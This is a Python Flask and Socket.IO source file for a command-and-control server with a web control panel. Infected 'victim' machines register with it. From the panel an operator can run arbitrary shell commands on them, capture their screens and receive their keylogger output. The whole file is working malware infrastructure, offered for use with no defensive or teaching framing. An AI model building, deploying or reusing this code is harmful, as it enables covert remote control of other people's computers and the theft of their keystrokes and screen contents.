#!/usr/bin/env python3
"""
C2 SERVER - Web Control Panel Version
Control devices directly from browser
"""

from flask import Flask, request, jsonify, send_file, Response
from flask_socketio import SocketIO, emit, join_room
from flask_cors import CORS
import os
import base64
import hashlib
import time
from datetime import datetime
import secrets
import threading
import json
from collections import defaultdict
import uuid

app = Flask(__name__)
CORS(app)
app.config['SECRET_KEY'] = secrets.token_hex(32)
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100MB

# SocketIO with threading
socketio = SocketIO(app, 
                   cors_allowed_origins="*",
                   async_mode='threading',
                   logger=False,
                   engineio_logger=False)

# Storage
for dir in ['uploads', 'downloads', 'screenshots', 'logs']:
    os.makedirs(dir, exist_ok=True)

# In-memory storage
clients = {}
client_sockets = {}
command_results = {}
pending_commands = defaultdict(list)
connected_controllers = set()  # Web controllers
client_last_active = {}

# Password for web control panel
WEB_PASSWORD = "admin123"  # CHANGE THIS!

print("""
╔══════════════════════════════════════════════════════╗
║           C2 WEB CONTROL PANEL v2.0                  ║
║      Control Devices from Browser                    ║
╚══════════════════════════════════════════════════════╝
""")

# ============= WEB CONTROL PANEL ROUTES =============

@app.route('/')
def index():
    """Main web control panel"""
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>C2 Web Control Panel</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 100%);
                color: #e0e0ff;
                min-height: 100vh;
            }
            .container {
                max-width: 1400px;
                margin: 0 auto;
                padding: 20px;
            }
            .header {
                background: rgba(0, 0, 0, 0.7);
                backdrop-filter: blur(10px);
                padding: 25px;
                border-radius: 15px;
                border: 1px solid #00aaff;
                box-shadow: 0 0 30px rgba(0, 170, 255, 0.3);
                margin-bottom: 30px;
                text-align: center;
            }
            h1 {
                color: #00aaff;
                font-size: 2.5em;
                margin-bottom: 10px;
                text-shadow: 0 0 10px rgba(0, 170, 255, 0.5);
            }
            .subtitle {
                color: #88ddff;
                font-size: 1.1em;
            }
            .stats-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                gap: 20px;
                margin-bottom: 30px;
            }
            .stat-card {
                background: rgba(0, 0, 0, 0.6);
                border-radius: 10px;
                padding: 20px;
                border: 1px solid #333355;
                transition: transform 0.3s;
            }
            .stat-card:hover {
                transform: translateY(-5px);
                border-color: #00aaff;
            }
            .stat-number {
                font-size: 2.5em;
                font-weight: bold;
                color: #00ffaa;
                text-shadow: 0 0 10px rgba(0, 255, 170, 0.5);
            }
            .stat-label {
                color: #aaddff;
                font-size: 0.9em;
                margin-top: 5px;
            }
            .main-content {
                display: grid;
                grid-template-columns: 2fr 1fr;
                gap: 30px;
            }
            @media (max-width: 1024px) {
                .main-content { grid-template-columns: 1fr; }
            }
            .panel {
                background: rgba(0, 0, 0, 0.7);
                border-radius: 15px;
                padding: 25px;
                border: 1px solid #333366;
            }
            .panel-title {
                color: #00aaff;
                font-size: 1.4em;
                margin-bottom: 20px;
                padding-bottom: 10px;
                border-bottom: 2px solid #00aaff;
            }
            .client-list {
                max-height: 500px;
                overflow-y: auto;
            }
            .client-item {
                background: rgba(20, 30, 50, 0.7);
                border-radius: 8px;
                padding: 15px;
                margin-bottom: 15px;
                border: 1px solid #334477;
                transition: all 0.3s;
            }
            .client-item:hover {
                border-color: #00aaff;
                background: rgba(30, 40, 70, 0.8);
            }
            .client-header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 10px;
            }
            .client-name {
                font-weight: bold;
                color: #88ddff;
                font-size: 1.2em;
            }
            .client-status {
                padding: 4px 12px;
                border-radius: 20px;
                font-size: 0.8em;
                font-weight: bold;
            }
            .status-online {
                background: rgba(0, 255, 0, 0.2);
                color: #00ff00;
                border: 1px solid #00ff00;
            }
            .status-offline {
                background: rgba(255, 0, 0, 0.2);
                color: #ff5555;
                border: 1px solid #ff5555;
            }
            .client-info {
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 10px;
                font-size: 0.9em;
                color: #aaccff;
            }
            .control-buttons {
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 10px;
                margin-top: 15px;
            }
            .btn {
                padding: 10px;
                border: none;
                border-radius: 6px;
                cursor: pointer;
                font-weight: bold;
                transition: all 0.3s;
                text-align: center;
                font-size: 0.9em;
            }
            .btn-primary {
                background: linear-gradient(135deg, #00aaff, #0088cc);
                color: white;
            }
            .btn-primary:hover {
                background: linear-gradient(135deg, #00bbff, #0099dd);
                box-shadow: 0 0 15px rgba(0, 170, 255, 0.5);
            }
            .btn-danger {
                background: linear-gradient(135deg, #ff5555, #cc0000);
                color: white;
            }
            .btn-danger:hover {
                background: linear-gradient(135deg, #ff6666, #dd0000);
                box-shadow: 0 0 15px rgba(255, 85, 85, 0.5);
            }
            .command-input {
                width: 100%;
                padding: 12px;
                background: rgba(0, 0, 0, 0.8);
                border: 1px solid #445588;
                border-radius: 8px;
                color: #ffffff;
                font-family: monospace;
                margin-bottom: 15px;
            }
            .command-input:focus {
                outline: none;
                border-color: #00aaff;
                box-shadow: 0 0 10px rgba(0, 170, 255, 0.3);
            }
            .log-output {
                background: rgba(0, 0, 0, 0.9);
                border: 1px solid #334477;
                border-radius: 8px;
                padding: 15px;
                height: 300px;
                overflow-y: auto;
                font-family: 'Courier New', monospace;
                font-size: 0.9em;
                color: #88ff88;
                white-space: pre-wrap;
                word-wrap: break-word;
            }
            .log-entry {
                margin-bottom: 8px;
                padding-bottom: 8px;
                border-bottom: 1px solid #223355;
            }
            .log-time {
                color: #8888ff;
                font-size: 0.8em;
            }
            .log-message {
                color: #ffffff;
            }
            .quick-commands {
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 10px;
                margin-top: 15px;
            }
            .quick-btn {
                padding: 8px;
                background: rgba(0, 100, 200, 0.3);
                border: 1px solid #3366aa;
                border-radius: 6px;
                color: #88ccff;
                cursor: pointer;
                transition: all 0.3s;
                font-size: 0.8em;
            }
            .quick-btn:hover {
                background: rgba(0, 120, 240, 0.4);
                border-color: #00aaff;
            }
            .modal {
                display: none;
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0, 0, 0, 0.8);
                z-index: 1000;
                align-items: center;
                justify-content: center;
            }
            .modal-content {
                background: linear-gradient(135deg, #0a0a1a, #1a1a3a);
                padding: 30px;
                border-radius: 15px;
                border: 2px solid #00aaff;
                max-width: 500px;
                width: 90%;
                max-height: 80vh;
                overflow-y: auto;
            }
            .form-group {
                margin-bottom: 20px;
            }
            .form-group label {
                display: block;
                margin-bottom: 8px;
                color: #88ddff;
            }
            .form-control {
                width: 100%;
                padding: 12px;
                background: rgba(0, 0, 0, 0.7);
                border: 1px solid #445588;
                border-radius: 8px;
                color: white;
            }
            .notification {
                position: fixed;
                top: 20px;
                right: 20px;
                padding: 15px 25px;
                border-radius: 8px;
                color: white;
                font-weight: bold;
                z-index: 1001;
                animation: slideIn 0.3s ease;
            }
            .notification.success {
                background: linear-gradient(135deg, #00aa00, #008800);
                border: 1px solid #00ff00;
            }
            .notification.error {
                background: linear-gradient(135deg, #aa0000, #880000);
                border: 1px solid #ff0000;
            }
            @keyframes slideIn {
                from { transform: translateX(100%); opacity: 0; }
                to { transform: translateX(0); opacity: 1; }
            }
            .online-indicator {
                display: inline-block;
                width: 10px;
                height: 10px;
                border-radius: 50%;
                margin-right: 8px;
                animation: pulse 2s infinite;
            }
            .indicator-online {
                background: #00ff00;
                box-shadow: 0 0 10px #00ff00;
            }
            @keyframes pulse {
                0%, 100% { opacity: 1; }
                50% { opacity: 0.5; }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🔗 C2 WEB CONTROL PANEL</h1>
                <p class="subtitle">Control connected devices directly from your browser</p>
                <div class="online-indicator indicator-online"></div>
                <span id="connection-status">Connected to Server</span>
            </div>
            
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-number" id="total-clients">0</div>
                    <div class="stat-label">Total Devices</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number" id="online-clients">0</div>
                    <div class="stat-label">Online Now</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number" id="total-commands">0</div>
                    <div class="stat-label">Commands Executed</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number" id="server-uptime">0s</div>
                    <div class="stat-label">Server Uptime</div>
                </div>
            </div>
            
            <div class="main-content">
                <!-- Left Panel: Device Control -->
                <div class="panel">
                    <div class="panel-title">📱 Connected Devices</div>
                    <div class="client-list" id="client-list">
                        <!-- Devices will appear here -->
                        <div style="text-align:center;padding:40px;color:#8888ff;">
                            No devices connected yet...
                        </div>
                    </div>
                </div>
                
                <!-- Right Panel: Control Center -->
                <div class="panel">
                    <div class="panel-title">🎮 Control Center</div>
                    
                    <div style="margin-bottom:25px;">
                        <div style="color:#88ddff;margin-bottom:10px;">Selected Device:</div>
                        <div id="selected-client" style="background:rgba(0,50,100,0.3);padding:12px;border-radius:8px;border:1px solid #3366aa;">
                            <span style="color:#8888ff;">No device selected</span>
                        </div>
                    </div>
                    
                    <div style="margin-bottom:25px;">
                        <div style="color:#88ddff;margin-bottom:10px;">Execute Command:</div>
                        <input type="text" 
                               id="command-input" 
                               class="command-input" 
                               placeholder="Type command (e.g., ls, whoami, ipconfig)">
                        <div style="display:flex;gap:10px;">
                            <button onclick="sendCommand()" class="btn btn-primary" style="flex:1;">Execute</button>
                            <button onclick="clearOutput()" class="btn btn-danger">Clear</button>
                        </div>
                    </div>
                    
                    <div style="margin-bottom:25px;">
                        <div style="color:#88ddff;margin-bottom:10px;">Quick Actions:</div>
                        <div class="quick-commands">
                            <button onclick="quickCommand('sysinfo')" class="quick-btn">System Info</button>
                            <button onclick="quickCommand('screenshot')" class="quick-btn">Take Screenshot</button>
                            <button onclick="quickCommand('ipconfig')" class="quick-btn">Network Info</button>
                            <button onclick="quickCommand('tasklist')" class="quick-btn">Running Processes</button>
                            <button onclick="quickCommand('dir')" class="quick-btn">List Files</button>
                            <button onclick="quickCommand('whoami')" class="quick-btn">Current User</button>
                            <button onclick="quickCommand('ps')" class="quick-btn">Process List</button>
                            <button onclick="quickCommand('ifconfig')" class="quick-btn">Network Config</button>
                        </div>
                    </div>
                    
                    <div>
                        <div style="color:#88ddff;margin-bottom:10px;display:flex;justify-content:space-between;">
                            <span>Command Output:</span>
                            <span id="output-status">Ready</span>
                        </div>
                        <div class="log-output" id="command-output">
                            <!-- Command output will appear here -->
                            <div style="color:#8888ff;text-align:center;padding:20px;">
                                Command output will appear here
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Device Control Modal -->
        <div id="device-modal" class="modal">
            <div class="modal-content">
                <h2 style="color:#00aaff;margin-bottom:20px;">Device Control</h2>
                <div id="modal-client-info"></div>
                <div class="form-group">
                    <label>Custom Command:</label>
                    <input type="text" id="modal-command" class="form-control" placeholder="Enter command...">
                </div>
                <div class="control-buttons">
                    <button onclick="executeModalCommand()" class="btn btn-primary">Execute</button>
                    <button onclick="closeModal()" class="btn btn-danger">Close</button>
                </div>
            </div>
        </div>
        
        <!-- Notification System -->
        <div id="notification" class="notification" style="display:none;"></div>
        
        <!-- WebSocket Connection -->
        <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
        <script>
            let socket = null;
            let selectedClientId = null;
            let serverStartTime = Date.now();
            
            // Initialize WebSocket connection
            function initWebSocket() {
                const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
                const wsUrl = protocol + '//' + window.location.host;
                
                socket = io(wsUrl, {
                    transports: ['websocket', 'polling'],
                    reconnection: true,
                    reconnectionAttempts: 5,
                    reconnectionDelay: 1000
                });
                
                socket.on('connect', () => {
                    showNotification('Connected to server', 'success');
                    updateConnectionStatus('Connected');
                    socket.emit('controller_connect');
                });
                
                socket.on('disconnect', () => {
                    showNotification('Disconnected from server', 'error');
                    updateConnectionStatus('Disconnected');
                });
                
                // Handle incoming events
                socket.on('client_online', (data) => {
                    addOrUpdateClient(data);
                    showNotification(`Device connected: ${data.hostname}`, 'success');
                });
                
                socket.on('client_offline', (data) => {
                    updateClientStatus(data.client_id, false);
                    showNotification(`Device disconnected: ${data.client_id}`, 'error');
                });
                
                socket.on('command_result', (data) => {
                    addToOutput(data);
                });
                
                socket.on('screenshot', (data) => {
                    showScreenshot(data);
                });
                
                socket.on('keylog', (data) => {
                    addToOutput({
                        client_id: data.client_id,
                        output: `[KEYLOG] ${data.keystrokes}`,
                        timestamp: new Date().toISOString()
                    });
                });
                
                socket.on('alert', (data) => {
                    showNotification(`Alert from ${data.client_id}: ${data.message}`, 'error');
                });
            }
            
            // Client management
            function addOrUpdateClient(client) {
                const list = document.getElementById('client-list');
                const clientId = client.client_id;
                
                let clientElement = document.getElementById(`client-${clientId}`);
                if (!clientElement) {
                    clientElement = createClientElement(client);
                    list.prepend(clientElement);
                } else {
                    updateClientElement(clientElement, client);
                }
                
                updateStats();
            }
            
            function createClientElement(client) {
                const div = document.createElement('div');
                div.className = 'client-item';
                div.id = `client-${client.client_id}`;
                div.onclick = () => selectClient(client.client_id);
                
                const statusClass = client.online ? 'status-online' : 'status-offline';
                const statusText = client.online ? 'ONLINE' : 'OFFLINE';
                
                div.innerHTML = `
                    <div class="client-header">
                        <div class="client-name">${client.hostname || client.client_id}</div>
                        <div class="client-status ${statusClass}">${statusText}</div>
                    </div>
                    <div class="client-info">
                        <div>User: ${client.username || 'Unknown'}</div>
                        <div>OS: ${client.os || 'Unknown'}</div>
                        <div>IP: ${client.ip || 'Unknown'}</div>
                        <div>Platform: ${client.platform || 'Unknown'}</div>
                    </div>
                    <div class="control-buttons">
                        <button onclick="controlDevice('${client.client_id}')" class="btn btn-primary">Control</button>
                        <button onclick="sendCommandToClient('${client.client_id}', 'screenshot')" class="btn btn-primary">Screenshot</button>
                    </div>
                `;
                
                return div;
            }
            
            function updateClientElement(element, client) {
                const statusElement = element.querySelector('.client-status');
                if (statusElement) {
                    statusElement.className = `client-status ${client.online ? 'status-online' : 'status-offline'}`;
                    statusElement.textContent = client.online ? 'ONLINE' : 'OFFLINE';
                }
                
                // Update last seen
                client_last_active[client.client_id] = Date.now();
            }
            
            function updateClientStatus(clientId, isOnline) {
                const element = document.getElementById(`client-${clientId}`);
                if (element) {
                    const statusElement = element.querySelector('.client-status');
                    if (statusElement) {
                        statusElement.className = `client-status ${isOnline ? 'status-online' : 'status-offline'}`;
                        statusElement.textContent = isOnline ? 'ONLINE' : 'OFFLINE';
                    }
                }
                updateStats();
            }
            
            // Command execution
            function selectClient(clientId) {
                selectedClientId = clientId;
                const client = Array.from(document.getElementsByClassName('client-item')).find(el => 
                    el.id === `client-${clientId}`
                );
                
                if (client) {
                    document.getElementById('selected-client').innerHTML = `
                        <div style="font-weight:bold;color:#88ddff;">${client.querySelector('.client-name').textContent}</div>
                        <div style="font-size:0.9em;color:#aaccff;">ID: ${clientId}</div>
                    `;
                }
            }
            
            function sendCommand() {
                if (!selectedClientId) {
                    showNotification('Please select a device first', 'error');
                    return;
                }
                
                const command = document.getElementById('command-input').value.trim();
                if (!command) {
                    showNotification('Please enter a command', 'error');
                    return;
                }
                
                executeCommand(selectedClientId, command);
                document.getElementById('command-input').value = '';
            }
            
            function quickCommand(command) {
                if (!selectedClientId) {
                    showNotification('Please select a device first', 'error');
                    return;
                }
                executeCommand(selectedClientId, command);
            }
            
            function executeCommand(clientId, command) {
                if (!socket || !socket.connected) {
                    showNotification('Not connected to server', 'error');
                    return;
                }
                
                const cmdId = 'cmd_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                socket.emit('execute_command', {
                    client_id: clientId,
                    command: command,
                    command_id: cmdId
                });
                
                addToOutput({
                    client_id: clientId,
                    command: command,
                    output: `[SENT] Command sent to device`,
                    timestamp: new Date().toISOString()
                });
                
                showNotification(`Command sent to device`, 'success');
            }
            
            function sendCommandToClient(clientId, command) {
                executeCommand(clientId, command);
            }
            
            function controlDevice(clientId) {
                selectedClientId = clientId;
                const modal = document.getElementById('device-modal');
                const clientElement = document.getElementById(`client-${clientId}`);
                
                if (clientElement) {
                    document.getElementById('modal-client-info').innerHTML = `
                        <div style="background:rgba(0,30,60,0.5);padding:15px;border-radius:8px;margin-bottom:20px;">
                            <div style="font-weight:bold;color:#88ddff;font-size:1.2em;">
                                ${clientElement.querySelector('.client-name').textContent}
                            </div>
                            <div style="color:#aaccff;font-size:0.9em;margin-top:5px;">
                                ID: ${clientId}
                            </div>
                        </div>
                    `;
                }
                
                modal.style.display = 'flex';
                document.getElementById('modal-command').focus();
            }
            
            function executeModalCommand() {
                const command = document.getElementById('modal-command').value.trim();
                if (command && selectedClientId) {
                    executeCommand(selectedClientId, command);
                    document.getElementById('modal-command').value = '';
                }
                closeModal();
            }
            
            function closeModal() {
                document.getElementById('device-modal').style.display = 'none';
            }
            
            // Output management
            function addToOutput(data) {
                const output = document.getElementById('command-output');
                const time = new Date(data.timestamp || Date.now()).toLocaleTimeString();
                
                const entry = document.createElement('div');
                entry.className = 'log-entry';
                entry.innerHTML = `
                    <div class="log-time">[${time}] Device: ${data.client_id || 'Unknown'}</div>
                    <div class="log-message">
                        ${data.command ? `<strong>Command:</strong> ${data.command}<br>` : ''}
                        <strong>Output:</strong><br>
                        <pre style="margin:5px 0;color:#88ff88;">${escapeHtml(data.output || 'No output')}</pre>
                    </div>
                `;
                
                output.prepend(entry);
                updateOutputStatus();
                
                // Auto-scroll
                output.scrollTop = 0;
            }
            
            function clearOutput() {
                document.getElementById('command-output').innerHTML = `
                    <div style="color:#8888ff;text-align:center;padding:20px;">
                        Output cleared
                    </div>
                `;
            }
            
            function showScreenshot(data) {
                const modal = document.createElement('div');
                modal.className = 'modal';
                modal.style.display = 'flex';
                modal.onclick = () => modal.remove();
                
                modal.innerHTML = `
                    <div class="modal-content" style="max-width:90%;max-height:90%;">
                        <h3 style="color:#00aaff;margin-bottom:15px;">Screenshot from ${data.client_id}</h3>
                        <img src="data:image/png;base64,${data.data}" 
                             style="max-width:100%;max-height:70vh;border:2px solid #00aaff;border-radius:8px;">
                        <div style="margin-top:15px;text-align:center;">
                            <button onclick="this.parentElement.parentElement.parentElement.remove()" 
                                    class="btn btn-danger">Close</button>
                        </div>
                    </div>
                `;
                
                document.body.appendChild(modal);
            }
            
            // Utility functions
            function escapeHtml(text) {
                const div = document.createElement('div');
                div.textContent = text;
                return div.innerHTML;
            }
            
            function showNotification(message, type) {
                const notification = document.getElementById('notification');
                notification.textContent = message;
                notification.className = `notification ${type}`;
                notification.style.display = 'block';
                
                setTimeout(() => {
                    notification.style.display = 'none';
                }, 3000);
            }
            
            function updateConnectionStatus(status) {
                document.getElementById('connection-status').textContent = status;
            }
            
            function updateStats() {
                const clients = document.getElementsByClassName('client-item');
                const online = Array.from(clients).filter(c => 
                    c.querySelector('.status-online')
                ).length;
                
                document.getElementById('total-clients').textContent = clients.length;
                document.getElementById('online-clients').textContent = online;
                document.getElementById('total-commands').textContent = 
                    document.getElementById('command-output').children.length - 1;
                
                // Update uptime
                const uptime = Math.floor((Date.now() - serverStartTime) / 1000);
                const hours = Math.floor(uptime / 3600);
                const minutes = Math.floor((uptime % 3600) / 60);
                const seconds = uptime % 60;
                document.getElementById('server-uptime').textContent = 
                    `${hours}h ${minutes}m ${seconds}s`;
            }
            
            function updateOutputStatus() {
                const output = document.getElementById('command-output');
                const count = output.children.length - 1;
                document.getElementById('output-status').textContent = 
                    count > 0 ? `${count} entries` : 'Ready';
            }
            
            // Initialize
            window.onload = function() {
                initWebSocket();
                
                // Request client list
                fetch('/api/clients')
                    .then(res => res.json())
                    .then(clients => {
                        clients.forEach(addOrUpdateClient);
                        updateStats();
                    });
                
                // Update stats every 5 seconds
                setInterval(updateStats, 5000);
                
                // Close modal on escape
                document.addEventListener('keydown', (e) => {
                    if (e.key === 'Escape') closeModal();
                    if (e.key === 'Enter' && document.getElementById('command-input') === document.activeElement) {
                        sendCommand();
                    }
                });
                
                // Prevent modal close when clicking inside
                document.getElementById('device-modal').addEventListener('click', (e) => {
                    if (e.target.classList.contains('modal')) {
                        closeModal();
                    }
                });
            };
        </script>
    </body>
    </html>
    """

@app.route('/api/clients')
def api_clients():
    """Get all clients"""
    client_list = []
    for client_id, client in clients.items():
        client_list.append({
            'client_id': client_id,
            'hostname': client.get('hostname', 'Unknown'),
            'username': client.get('username', 'Unknown'),
            'os': client.get('os', 'Unknown'),
            'platform': client.get('platform', 'Unknown'),
            'ip': client.get('ip', 'Unknown'),
            'online': client.get('online', False),
            'last_seen': client.get('last_seen', 0)
        })
    return jsonify(client_list)

@app.route('/api/execute', methods=['POST'])
def api_execute():
    """Execute command via API"""
    data = request.get_json()
    client_id = data.get('client_id')
    command = data.get('command')
    
    if not client_id or not command:
        return jsonify({'error': 'Missing client_id or command'}), 400
    
    if client_id not in clients:
        return jsonify({'error': 'Client not found'}), 404
    
    cmd_id = f"cmd_{int(time.time())}_{secrets.token_hex(4)}"
    cmd_obj = {
        'id': cmd_id,
        'command': command,
        'timestamp': time.time(),
        'status': 'pending'
    }
    
    if client_id in client_sockets:
        socketio.emit('command', cmd_obj, room=client_sockets[client_id])
        return jsonify({'status': 'sent', 'command_id': cmd_id})
    else:
        pending_commands[client_id].append(cmd_obj)
        return jsonify({'status': 'queued', 'command_id': cmd_id})

@app.route('/api/screenshot/<client_id>')
def api_screenshot(client_id):
    """Request screenshot from client"""
    if client_id not in clients:
        return jsonify({'error': 'Client not found'}), 404
    
    cmd_id = f"screenshot_{int(time.time())}_{secrets.token_hex(4)}"
    cmd_obj = {
        'id': cmd_id,
        'type': 'screenshot',
        'timestamp': time.time()
    }
    
    if client_id in client_sockets:
        socketio.emit('command', cmd_obj, room=client_sockets[client_id])
        return jsonify({'status': 'sent', 'command_id': cmd_id})
    else:
        return jsonify({'error': 'Client offline'}), 400

# ============= SOCKET.IO EVENTS =============

@socketio.on('connect')
def handle_connect():
    print(f"[+] New connection: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    # Check if it's a controller
    if request.sid in connected_controllers:
        connected_controllers.remove(request.sid)
        print(f"[-] Controller disconnected: {request.sid}")
        return
    
    # Check if it's a client
    for client_id, socket_id in list(client_sockets.items()):
        if socket_id == request.sid:
            if client_id in clients:
                clients[client_id]['online'] = False
                clients[client_id]['last_seen'] = time.time()
            del client_sockets[client_id]
            print(f"[-] Client disconnected: {client_id}")
            socketio.emit('client_offline', {'client_id': client_id})
            break

@socketio.on('controller_connect')
def handle_controller_connect():
    """Web controller connects"""
    connected_controllers.add(request.sid)
    print(f"[+] Web controller connected: {request.sid}")
    emit('controller_ready', {'message': 'Connected to C2 server'})

@socketio.on('execute_command')
def handle_execute_command(data):
    """Execute command from web interface"""
    client_id = data.get('client_id')
    command = data.get('command')
    cmd_id = data.get('command_id', f"cmd_{int(time.time())}_{secrets.token_hex(4)}")
    
    if client_id in client_sockets:
        cmd_obj = {
            'id': cmd_id,
            'command': command,
            'timestamp': time.time(),
            'status': 'pending'
        }
        socketio.emit('command', cmd_obj, room=client_sockets[client_id])
        emit('command_sent', {'command_id': cmd_id, 'client_id': client_id})
    else:
        emit('command_error', {'error': 'Client offline', 'client_id': client_id})

@socketio.on('register')
def handle_register(data):
    """Client (victim) registers with server"""
    client_id = data.get('id')
    
    if not client_id:
        # Generate unique ID
        unique = f"{data.get('hostname', '')}{data.get('username', '')}{data.get('os', '')}{time.time()}"
        client_id = hashlib.sha256(unique.encode()).hexdigest()[:16]
    
    # Store client info
    clients[client_id] = {
        'id': client_id,
        'hostname': data.get('hostname', 'Unknown'),
        'username': data.get('username', 'Unknown'),
        'os': data.get('os', 'Unknown'),
        'platform': data.get('platform', 'Unknown'),
        'ip': request.remote_addr,
        'online': True,
        'first_seen': time.time(),
        'last_seen': time.time()
    }
    
    # Map socket to client
    client_sockets[client_id] = request.sid
    join_room(client_id)
    
    print(f"[+] Client registered: {client_id} - {data.get('hostname')} ({data.get('platform')})")
    
    # Send welcome
    emit('welcome', {
        'client_id': client_id,
        'message': 'Connected to C2 Server',
        'timestamp': time.time()
    })
    
    # Notify all web controllers
    socketio.emit('client_online', {
        'client_id': client_id,
        'hostname': data.get('hostname'),
        'username': data.get('username'),
        'os': data.get('os'),
        'platform': data.get('platform'),
        'ip': request.remote_addr,
        'online': True
    })
    
    # Send any pending commands
    if client_id in pending_commands and pending_commands[client_id]:
        for cmd in pending_commands[client_id]:
            emit('command', cmd)
        pending_commands[client_id].clear()

@socketio.on('heartbeat')
def handle_heartbeat(data):
    """Client heartbeat"""
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        clients[client_id]['last_seen'] = time.time()
        clients[client_id]['online'] = True
        emit('heartbeat_ack', {'timestamp': time.time()})

@socketio.on('result')
def handle_result(data):
    """Command result from client"""
    cmd_id = data.get('command_id')
    client_id = data.get('client_id')
    
    print(f"[*] Result from {client_id}: {data.get('command', 'Unknown')[:50]}...")
    
    # Store result
    result_data = {
        'command_id': cmd_id,
        'client_id': client_id,
        'command': data.get('command', ''),
        'output': data.get('output', ''),
        'success': data.get('success', True),
        'status': 'completed',
        'timestamp': time.time()
    }
    
    # Save to file
    try:
        with open(f'logs/result_{cmd_id}.json', 'w') as f:
            json.dump(result_data, f)
    except:
        pass
    
    # Forward to all web controllers
    socketio.emit('command_result', result_data)

@socketio.on('screenshot')
def handle_screenshot(data):
    """Screenshot from client"""
    client_id = data.get('client_id')
    img_data = data.get('data')
    
    if img_data:
        try:
            # Save screenshot
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"screenshot_{client_id[:8]}_{timestamp}.png"
            filepath = os.path.join('screenshots', filename)
            
            with open(filepath, 'wb') as f:
                f.write(base64.b64decode(img_data))
            
            print(f"[📸] Screenshot from {client_id}: {filename}")
            
            # Forward to web controllers
            socketio.emit('screenshot', {
                'client_id': client_id,
                'filename': filename,
                'data': img_data,
                'timestamp': time.time()
            })
        
        except Exception as e:
            print(f"[!] Screenshot error: {e}")

@socketio.on('keylog')
def handle_keylog(data):
    """Keylogger data from client"""
    socketio.emit('keylog', data)

@socketio.on('alert')
def handle_alert(data):
    """Alert from client"""
    socketio.emit('alert', data)

# ============= CLEANUP THREAD =============

def cleanup_thread():
    """Cleanup old data"""
    while True:
        try:
            # Mark inactive clients as offline
            cutoff = time.time() - 60  # 1 minute
            for client_id, client in list(clients.items()):
                if client.get('last_seen', 0) < cutoff and client.get('online', False):
                    clients[client_id]['online'] = False
                    socketio.emit('client_offline', {'client_id': client_id})
            
            # Clean old logs (older than 7 days)
            cutoff_time = time.time() - (7 * 86400)
            for folder in ['logs', 'screenshots', 'downloads', 'uploads']:
                if os.path.exists(folder):
                    for filename in os.listdir(folder):
                        filepath = os.path.join(folder, filename)
                        if os.path.isfile(filepath):
                            if os.path.getmtime(filepath) < cutoff_time:
                                try:
                                    os.remove(filepath)
                                except:
                                    pass
            
            time.sleep(30)
            
        except Exception as e:
            print(f"[!] Cleanup error: {e}")
            time.sleep(60)

# Start cleanup thread
threading.Thread(target=cleanup_thread, daemon=True).start()

# ============= MAIN =============

def main():
    port = int(os.environ.get('PORT', 5000))
    
    print(f"[*] Starting C2 Web Control Panel on port {port}")
    print(f"[*] Web Interface: http://0.0.0.0:{port}")
    print(f"[*] WebSocket: ws://0.0.0.0:{port}/socket.io")
    print(f"[*] Features:")
    print(f"    ✓ Web-based device control")
    print(f"    ✓ Real-time command execution")
    print(f"    ✓ Screenshot capture")
    print(f"    ✓ File management")
    print(f"    ✓ Keylogging")
    print(f"    ✓ Multi-device support")
    print()
    print(f"[*] Access the control panel from any browser!")
    print()
    
    socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)

if __name__ == '__main__':
    main()
